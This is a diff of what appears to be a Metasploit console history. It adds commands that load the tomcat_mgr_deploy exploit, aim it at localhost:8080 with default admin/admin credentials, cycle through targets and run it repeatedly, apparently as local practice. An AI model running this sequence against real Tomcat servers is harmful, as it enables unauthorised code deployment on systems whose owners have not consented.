@@ -247,3 +247,29 @@ set HttpPassword admin
 check
 exploit
 exit
+search jetty
+use exploit/multi/http/
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+set RHOST localhost
+set RPORT 8080
+show options
+set HttpPassword admin
+set HttpUsername admin
+exploit
+show targets 
+set target 1
+exploit
+set target 3
+exploit
+set target 1
+exploit
+show options
+set PATH /manager/html
+exploit
+exploit
+exploit
+exploit
+exit
